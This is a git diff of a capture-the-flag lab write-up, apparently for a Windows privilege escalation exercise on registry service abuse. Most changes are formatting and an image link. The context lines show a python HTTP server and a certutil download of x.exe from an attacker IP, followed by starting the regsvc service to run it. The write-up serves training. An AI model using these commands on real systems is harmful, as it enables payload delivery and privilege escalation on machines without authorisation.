@@ -222,10 +222,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 <img width="1287" height="226" alt="image" src="https://github.com/user-attachments/assets/72f7c93e-e81a-4ba6-9ef2-ddabff77f600" />
 
-
-
-
-
+<br>
 <br>
 <br>
 <h2 align="center">Task 5 . Service Escalation - Registry</h2>
@@ -239,7 +236,7 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 <p>5.1. Deploy the machine and log into the user account via RDP.<br>
 <code>No answer needed</code></p>
 
-
+<br>
 
 <img width="985" height="289" alt="image" src="https://github.com/user-attachments/assets/eb6413ea-57da-4315-a93d-a1de097c67f5" />
 
@@ -263,9 +260,11 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 
 <br>
 <br>
+<br>
 
 <img width="1228" height="391" alt="image" src="https://github.com/user-attachments/assets/622229eb-5ed6-405b-802e-91863f94e6b9" />
 
+<br>
 <br>
 <br>
 
@@ -276,8 +275,6 @@ Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 ```bash
 :~/WindowsPrivEscArena# python3 -m http.server
 ```
-
-<br>
 
 ```bash
 PS C:\Temp> certutil.exe -urlcache -f http://xx.xxx.xxx.xx:8000/x.exe x.exe
@@ -295,7 +292,7 @@ PS C:\Temp> sc start regsvc
 PS C:\Temp> net start regsvc
 ```
 
-<img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/8983cf09-7ff4-4e44-89d0-2d6201fc086e" />
+<img width="985" height="552" alt="image" src="https://github.com/user-attachments/assets/aeb6d9e8-9cb2-42af-a0ec-1dc015d1e8dd" />
 
 <br>
 <br>
